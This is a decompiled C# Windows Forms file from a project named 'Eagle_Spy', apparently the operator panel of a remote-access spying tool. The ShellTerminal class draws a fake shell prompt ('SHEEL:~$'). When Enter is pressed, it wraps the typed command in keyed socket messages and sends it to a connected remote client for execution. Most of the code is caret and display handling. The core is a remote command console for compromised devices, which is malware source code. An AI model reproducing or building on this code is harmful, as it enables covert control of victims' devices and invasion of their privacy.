using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000A6 RID: 166
	[DesignerGenerated]
	public partial class ShellTerminal : Form
	{
		// Token: 0x060008BC RID: 2236 RVA: 0x000D8CF0 File Offset: 0x000D6EF0
		public ShellTerminal()
		{
			base.Load += this.ShellTerminal_Load;
			this.Title = "null";
			this.rect = default(Rectangle);
			this.hidCareat = -1;
			this.CareatSize = new Size(6, 12);
			this.TAGx = "SHEEL:~$";
			this.ignore = false;
			this.IAMNew = true;
			this.InitializeComponent();
		}

		// Token: 0x060008BF RID: 2239 RVA: 0x000D9160 File Offset: 0x000D7360
		private void SpyStyle()
		{
			foreach (RichTextBox richTextBox in base.Controls.OfType<RichTextBox>())
			{
				richTextBox.ForeColor = SpySettings.DefaultColor_Foreground;
				richTextBox.BackColor = SpySettings.DefaultColor_Background;
			}
		}

		// Token: 0x060008C0 RID: 2240 RVA: 0x00004E17 File Offset: 0x00003017
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x060008C1 RID: 2241 RVA: 0x000D91C4 File Offset: 0x000D73C4
		private void ShellTerminal_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\15.ico");
			this.OutText.Font = reso.f;
			Size size = TextRenderer.MeasureText("S", reso.f);
			this.CareatSize = new Size(checked((int)Math.Round((double)size.Width / 2.0)), size.Height);
			this.SpyStyle();
			this.Text = this.Title;
			this.OutText.ContextMenuStrip = this.ctxMenu;
			this.Color_Default = this.OutText.ForeColor;
			this.OutText.TabStop = false;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			this.OutText.Focus();
			this.OutText.Select();
		}

		// Token: 0x060008C2 RID: 2242 RVA: 0x000D92A8 File Offset: 0x000D74A8
		private void CaretShell(int alva)
		{
			string text = this.OutText.Text;
			if (text.Length > 0)
			{
				if (!(this.rect == default(Rectangle)))
				{
					this.OutText.Invalidate(this.rect);
				}
				this.OutText.Update();
				Graphics graphics = this.OutText.CreateGraphics();
				Point positionFromCharIndex = this.OutText.GetPositionFromCharIndex(this.OutText.SelectionStart);
				this.rect = new Rectangle(positionFromCharIndex.X, positionFromCharIndex.Y, this.CareatSize.Width, this.CareatSize.Height);
				int num = (int)this.Color_Default.A;
				if (this.OutText.SelectionStart != text.Length)
				{
					num = alva;
				}
				graphics.FillRectangle(new Pen(Color.FromArgb(num, (int)this.Color_Default.R, (int)this.Color_Default.G, (int)this.Color_Default.B), (float)this.CareatSize.Width).Brush, this.rect);
				graphics.Dispose();
			}
		}

		// Token: 0x060008C3 RID: 2243 RVA: 0x000D93C4 File Offset: 0x000D75C4
		private void Caret_Tick(object sender, EventArgs e)
		{
			if (this.ignore)
			{
				return;
			}
			if (this.hidCareat == -1)
			{
				if (!(this.rect == default(Rectangle)))
				{
					this.OutText.Invalidate(this.rect);
				}
				this.hidCareat = 1;
				return;
			}
			this.CaretShell(128);
			this.hidCareat = -1;
		}

		// Token: 0x060008C4 RID: 2244 RVA: 0x00004E4D File Offset: 0x0000304D
		private void OutText_TextChanged(object sender, EventArgs e)
		{
			if (!this.IAMNew && this.OutText.Text.Length == 0)
			{
				this.NewTag(false);
				return;
			}
			if (!this.ignore)
			{
				this.RestCaret();
			}
		}

		// Token: 0x060008C5 RID: 2245 RVA: 0x00004E7F File Offset: 0x0000307F
		private void OutText_MouseClick(object sender, MouseEventArgs e)
		{
			if (!this.ignore)
			{
				this.RestCaret();
			}
		}

		// Token: 0x060008C6 RID: 2246 RVA: 0x000D9424 File Offset: 0x000D7624
		private void OutText_KeyDown(object sender, KeyEventArgs e)
		{
			if ((e.KeyData == Keys.Up) | (e.KeyData == Keys.Down) | (e.KeyData == Keys.Right) | (e.KeyData == Keys.Left))
			{
				e.SuppressKeyPress = true;
				return;
			}
			if ((Control.ModifierKeys == Keys.Shift) | (Control.ModifierKeys == Keys.Control))
			{
				e.SuppressKeyPress = true;
				return;
			}
			if (this.OutText.ReadOnly || this.ignore)
			{
				return;
			}
			if (e.KeyData == Keys.Return)
			{
				e.SuppressKeyPress = true;
				if (this.OutText.Lines.Length != 0)
				{
					string text = this.OutText.Lines[checked(this.OutText.Lines.Length - 1)];
					if (!text.Contains(this.TAGx))
					{
						this.NewTag(true);
						return;
					}
					text = text.Substring(this.TAGx.Length);
					if (text.Length == 0)
					{
						return;
					}
					if (this.classClient != null)
					{
						object[] array = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".terminal",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.getCommand,
								Data.SPL_SOCKET,
								"command",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.OutText.ReadOnly = true;
						this.ignore = true;
						if (!(this.rect == default(Rectangle)))
						{
							this.OutText.Invalidate(this.rect);
						}
						this.classClient.SendMessage(array);
					}
				}
			}
			this.RestCaret();
		}

		// Token: 0x060008C7 RID: 2247 RVA: 0x000D9604 File Offset: 0x000D7804
		public void NewTag(bool isLine)
		{
			this.OutText.DeselectAll();
			if (isLine)
			{
				RTB outText = this.OutText;
				outText.AppendText("\r\n" + this.TAGx);
			}
			else
			{
				RTB outText2 = this.OutText;
				outText2.AppendText(this.TAGx);
			}
			this.OutText.SelectionStart = this.OutText.Text.Length;
		}

		// Token: 0x060008C8 RID: 2248 RVA: 0x00004E8F File Offset: 0x0000308F
		private void RestCaret()
		{
			if (!this.ignore)
			{
				this.CaretShell(128);
				this.Caret.Enabled = false;
				this.Caret.Enabled = true;
			}
		}

		// Token: 0x060008C9 RID: 2249 RVA: 0x00004EBC File Offset: 0x000030BC
		private void OutText_HScroll(object sender, EventArgs e)
		{
			this.OutText.Invalidate();
			this.CaretShell(255);
		}

		// Token: 0x060008CA RID: 2250 RVA: 0x00004EBC File Offset: 0x000030BC
		private void OutText_VScroll(object sender, EventArgs e)
		{
			this.OutText.Invalidate();
			this.CaretShell(255);
		}

		// Token: 0x060008CB RID: 2251 RVA: 0x00004ED4 File Offset: 0x000030D4
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!this.OutText.ReadOnly)
			{
				this.OutText.Paste();
			}
		}

		// Token: 0x060008CC RID: 2252 RVA: 0x00004EEE File Offset: 0x000030EE
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.OutText.Copy();
		}

		// Token: 0x04000A61 RID: 2657
		public TcpClient Client;

		// Token: 0x04000A62 RID: 2658
		public Client classClient;

		// Token: 0x04000A63 RID: 2659
		public string Title;

		// Token: 0x04000A64 RID: 2660
		public Color Color_Default;

		// Token: 0x04000A65 RID: 2661
		private Rectangle rect;

		// Token: 0x04000A66 RID: 2662
		private int hidCareat;

		// Token: 0x04000A67 RID: 2663
		private Size CareatSize;

		// Token: 0x04000A68 RID: 2664
		private string TAGx;

		// Token: 0x04000A69 RID: 2665
		public bool ignore;

		// Token: 0x04000A6A RID: 2666
		public bool IAMNew;
	}
}
